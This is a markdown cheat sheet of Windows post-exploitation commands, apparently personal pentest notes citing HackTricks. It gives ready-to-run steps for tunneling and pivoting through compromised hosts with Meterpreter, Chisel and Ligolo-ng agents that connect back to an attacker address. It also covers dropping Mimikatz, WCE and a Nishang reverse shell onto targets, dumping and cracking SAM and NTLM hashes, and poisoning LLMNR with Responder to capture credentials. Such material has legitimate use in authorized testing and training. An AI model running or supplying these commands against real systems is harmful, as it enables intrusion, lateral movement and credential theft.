# Windows Post-Exploit

- [Windows Post-Exploit](#windows-post-exploit)
- [Switch user](#switch-user)
  - [Powershell](#powershell)
  - [Tool](#tool)
- [Pivoting](#pivoting)
  - [Meterpreter](#meterpreter)
    - [Set Route](#set-route)
  - [Chisel](#chisel)
    - [Port forwarding](#port-forwarding)
    - [Traffic forwarding](#traffic-forwarding)
      - [Server (Attacker)](#server-attacker)
      - [Target](#target)
      - [Proxychains](#proxychains)
  - [Ligolo-ng - Tunneling like a VPN](#ligolo-ng---tunneling-like-a-vpn)
    - [Linux server](#linux-server)
      - [When agent is connected](#when-agent-is-connected)
    - [Windows agent](#windows-agent)
    - [Linux agent](#linux-agent)
- [Compile for windows](#compile-for-windows)
  - [X86](#x86)
  - [X64](#x64)
- [Dump Password](#dump-password)
  - [Windows Credentials Editor](#windows-credentials-editor)
  - [Mimikatz](#mimikatz)
  - [Crack SAM + SYSTEM](#crack-sam--system)
- [Nishang](#nishang)
- [Responder - LLMNR & NBT-NS Poisoning](#responder---llmnr--nbt-ns-poisoning)
- [Source](#source)

# Switch user

## Powershell

```powershell
$username='Admin'
$password='Password123'
$securePassword=(ConvertTo-SecureString $password -AsPlainText -Force)
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```

> Elevate cmd

```batch
runas /user:admin cmd
powershell -Command "Start-Process cmd -Verb RunAs"
```

## Tool

```powershell
WinNC.exe IP_ADDRESS PORT -u USERNAME -p PASSWORD [cmd|pwd|rtcp]
```

# Pivoting

## Meterpreter

### Set Route

```batch
run autoroute -s 172.16.1.0/24
```

Check the result

```batch
run autoroute -p
```

Run server SOCK4

```batch
use auxiliary/server/socks4a
set SRVPORT 9050
run -j 
```

## Chisel

### Port forwarding

> Client

```batch
chisel client Server_IP:6666 R:7777:127.0.0.1:8443
```

> Server

```batch
chisel server -p port --reverse
```

Connect:

<https://127.0.0.1:7777>

### Traffic forwarding

#### Server (Attacker)

```batch
1.chisel server -p 8000 -reverse
4.chisel client 127.0.0.1:8001 socks
```

#### Target

```batch
2.chisel client Server_IP:8000 R:8001:127.0.0.1:1337
3.chisel server -p 1337 --socks5
```

#### Proxychains

> proxychains

`nano /etc/proxychains.conf`

```batch
socks5         127.0.0.1 1080
```

proxychains command

> Nmap

```batch
proxychains -q nmap -sT -P0 IP_ADDRESS
```

> Foxy proxy

```text
For the web 
```

## Ligolo-ng - Tunneling like a VPN

### Linux server

> Pre-config

```bash
sudo ip tuntap add user USERNAME mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert
```

#### When agent is connected

Add the route of the network:

```bash
sudo ip route add 192.168.0.0/24 dev ligolo
```

> Start tunneling

```batch
sessions NUM_AGENT
start
```

### Windows agent

```batch
agent.exe -connect 192.168.100.141:11601 -ignore-cert
```

### Linux agent

```batch
agent -connect 192.168.100.141:11601 -ignore-cert
```

# Compile for windows

## X86

> C

```batch
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

> C++

```batch
i686-w64-mingw32-g++ exploit.c -o exploit.exe -lws2_32
```

## X64

> C

```batch
x86_64-w64-mingw32-gcc exploit.cpp -o exploit.exe
```

> C++

```batch
x86_64-w64-mingw32-g++ exploit.cpp -o exploit.exe
```

# Dump Password
## Windows Credentials Editor

Drop those **file** to the target computer

```path
/usr/share/wce/wce_x64.exe
/usr/share/wce/wce.exe
```

## Mimikatz

Drop those **Directory** to the target computer

```path
/usr/share/mimikatz/Win32
/usr/share/mimikatz/x64
```

Powershell code

```path
/usr/share/mimikatz/Invoke-Mimikatz.ps1
```

## Crack SAM + SYSTEM

samdump2 system sam > hash

> John

```batch
john hash
```

> Hashcat

```bach
cat dumpHash | cut -d ":" -f 4 | sort | uniq > ntlm.txt
hashcat -m 1000 -a 3 ./ntlm.txt -w 3 rockyou.txt
```

# Nishang
Pentest tools and script (Backdoor/Bypass/PrivEscal/MITM/Pivot/Scan/InfoGather)
(<https://github.com/samratashok/nishang.git>)

Drop this **Directory** to the target computer

```path
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```

# Responder - LLMNR & NBT-NS Poisoning

To listen

```bach
responder -i ens33 -f 
```

Path of the hash

```batch
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt
```

Crack the hash

```bach
john /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt --format=netntlmv2 --wordlist=rockyou.txt
```

# Source 

<https://book.hacktricks.xyz/windows/windows-local-privilege-escalation>
